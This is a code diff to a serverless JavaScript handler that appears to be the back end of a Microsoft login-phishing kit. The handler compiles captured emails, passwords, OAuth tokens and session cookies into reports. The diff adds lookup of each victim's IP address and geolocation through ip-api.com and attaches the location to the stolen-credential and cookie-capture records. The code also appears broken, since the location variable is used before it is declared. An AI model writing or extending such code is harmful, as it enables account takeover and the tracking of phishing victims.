@@ -153,7 +153,10 @@ const handler = async (event, context) => {
       `📧 Email: ${email}`,
       `🆔 Session ID: ${sessionId}`,
       `⏰ Time: ${timestamp}`,
-      `🆔 Message ID: ${uniqueId}`
+      `🆔 Message ID: ${uniqueId}`,
+      `🌍 IP: ${userIpInfo.ip}`,
+      `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
+      `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
     ];
     
     // Add password if ACTUALLY captured (not debug)
@@ -201,6 +204,46 @@ const handler = async (event, context) => {
     console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
     console.log('🔍 Token check result:', !!data.authenticationTokens);
     
+    // Get user IP and location information
+    let userIpInfo = {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+        timezone: 'Unknown'
+    };
+    
+    try {
+        // Get IP from request headers (Netlify provides this)
+        const clientIP = event.headers['x-forwarded-for'] || 
+                        event.headers['x-real-ip'] || 
+                        event.headers['cf-connecting-ip'] ||
+                        'Unknown';
+        
+        console.log('🌍 Detected IP address:', clientIP);
+        
+        // Get location info from a free IP geolocation service
+        const ipResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,message,country,countryCode,region,regionName,city,timezone,query`);
+        const ipData = await ipResponse.json();
+        
+        if (ipData.status === 'success') {
+            userIpInfo = {
+                ip: ipData.query || clientIP,
+                country: ipData.country || 'Unknown',
+                countryCode: ipData.countryCode || 'Unknown',
+                city: ipData.city || 'Unknown',
+                region: ipData.regionName || 'Unknown',
+                timezone: ipData.timezone || 'Unknown'
+            };
+            console.log('🌍 Location detected:', userIpInfo);
+        } else {
+            userIpInfo.ip = clientIP;
+            console.log('⚠️ Could not get location data, using IP only');
+        }
+    } catch (error) {
+        console.log('❌ Error getting IP/location:', error.message);
+    }
+
     // Always send token file to debug the issue
     console.log('🔧 FORCING token file creation for debugging...');
     const hasTokens = !!data.authenticationTokens;
@@ -220,7 +263,16 @@ const handler = async (event, context) => {
                 timestamp: timestamp,
                 messageId: uniqueId,
                 userAgent: data.userAgent,
-                source: 'Microsoft OAuth 2.0 Authentication'
+                source: 'Microsoft OAuth 2.0 Authentication',
+                userLocation: {
+                    ipAddress: userIpInfo.ip,
+                    country: userIpInfo.country,
+                    countryCode: userIpInfo.countryCode,
+                    city: userIpInfo.city,
+                    region: userIpInfo.region,
+                    timezone: userIpInfo.timezone,
+                    detectedAt: timestamp
+                }
             },
             authenticationTokens: {
                 authorizationCode: tokens.authorizationCode || 'Not captured',
@@ -364,7 +416,16 @@ const handler = async (event, context) => {
                 userAgent: data.userAgent,
                 source: 'Microsoft Cookie Capture',
                 cookieCount: cookieCount,
-                cookieSource: cookieSource
+                cookieSource: cookieSource,
+                userLocation: {
+                    ipAddress: userIpInfo.ip,
+                    country: userIpInfo.country,
+                    countryCode: userIpInfo.countryCode,
+                    city: userIpInfo.city,
+                    region: userIpInfo.region,
+                    timezone: userIpInfo.timezone,
+                    detectedAt: timestamp
+                }
             },
             cookies: cookies.map(cookie => ({
                 name: cookie.name,
